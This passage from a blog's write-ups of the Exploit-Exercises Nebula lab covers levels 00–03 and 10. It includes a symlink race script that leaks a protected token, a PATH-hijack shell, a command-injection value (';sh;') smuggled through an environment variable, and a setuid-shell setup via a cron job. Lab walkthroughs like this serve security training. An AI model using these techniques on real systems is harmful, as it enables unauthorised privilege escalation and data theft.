<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'><span class="cp">#undef HITHERE</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>What to do is immediately clear, there is a race condition in the code, after
we call access() to some file, it could be different file with the same name,
which we are trying to open.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 access
</span><span class='line'>
</span><span class='line'>  Warning:  Using access() to check if a user is authorized to, for example, open
</span><span class='line'>  a file before actually doing so using open(2) creates a security hole, because
</span><span class='line'>  the user might exploit the short time interval between checking and opening the
</span><span class='line'>  file to manipulate it.  For this reason, the use of this system call should be
</span><span class='line'>  avoided.</span></code></pre></td></tr></table></div></figure>


<p>So /home/flag10/flag10 binary sends arbitrary file with access() permission to
some host, port 18211.</p>

<p>We can test it in two screens using:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ nc -l 18211
</span><span class='line'>
</span><span class='line'>sh-4.2$ /home/flag10/flag10 /etc/passwd 0</span></code></pre></td></tr></table></div></figure>


<p>Our exploit:</p>

<figure class='code'><figcaption><span>mklink.sh </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/usr/bin/env bash</span>
</span><span class='line'>
</span><span class='line'>run_netcat<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> nc -l 18211<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>make_symlinks<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -sf /dev/null /tmp/token <span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>run_flag<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 /tmp/token <span class="m">0</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>run_netcat <span class="p">&amp;</span>
</span><span class='line'>make_symlinks <span class="p">&amp;</span>
</span><span class='line'>run_flag <span class="p">&amp;</span>
</span><span class='line'>
</span><span class='line'>sleep 0.05
</span><span class='line'>pkill -P <span class="nv">$$</span> <span class="c"># Kill all children</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> ./mklink.sh
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31349 Terminated              run_netcat</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31350 Terminated              make_symlinks</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31351 Terminated              run_flag</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> su flag10
</span><span class='line'><span class="go">Password: </span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=989(flag10) gid=989(flag10) groups=989(flag10)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (00-05)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05/"/>
    <updated>2015-06-16T19:04:18+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<p>Because it was not possible to log in via ssh, we generated the host key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span></code></pre></td></tr></table></div></figure>


<h2>Level00</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> find / <span class="se">\(</span> -perm -4000 <span class="se">\)</span> 2&gt;/dev/null
</span><span class='line'><span class="go">/bin/.../flag00</span>
</span><span class='line'><span class="go">/bin/fusermount</span>
</span><span class='line'><span class="go">/bin/mount</span>
</span><span class='line'><span class="go">/bin/ping</span>
</span><span class='line'><span class="go">/bin/ping6</span>
</span><span class='line'><span class="go">/bin/su</span>
</span><span class='line'><span class="go">[ .. SNIP .. ]</span>
</span></code></pre></td></tr></table></div></figure>


<p>We found a suspicious file on the first line, after executing, we obtained flag.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1001(level00) gid=1001(level00) groups=1001(level00)</span>
</span><span class='line'><span class="gp">level00@nebula:~$</span> /bin/.../flag00
</span><span class='line'><span class="go">Congrats, now run getflag to get your flag!</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level01</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;sh&#39;</span> &gt; <span class="nb">echo</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span><span class="nb"> </span>chmod +x ./echo
</span><span class='line'><span class="gp">level01@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1002(level01) gid=1002(level01) groups=1002(level01)</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> /home/flag01/flag01
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)</span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level02</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level02@nebula:~$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;;sh;&#39;</span>
</span><span class='line'><span class="gp">level02@nebula:~$</span> /home/flag02/flag02
</span><span class='line'><span class="go">about to call system(&quot;/bin/echo ;sh; is cool&quot;)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level03</h2>

<p>There is a crontab entry that is called every couple of minutes.</p>

<p>Because the /tmp is mounted with nosuid option, we use home directory to store suid binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level03@nebula:~$</span> mount <span class="p">|</span> grep nosuid
</span><span class='line'><span class="go">proc on /proc type proc (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)</span>
</span><span class='line'><span class="go">tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)</span>
</span><span class='line'><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)</span>
</span><span class='line'><span class="go">none on /run/shm type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,nosuid,nodev,default_permissions,allow_other)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The file invoked by cron is here:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Our code to obtain suid shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> /home/flag03/writable.d/
</span><span class='line'>
</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="s1">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">int main()</span>
</span><span class='line'><span class="s1">{</span>
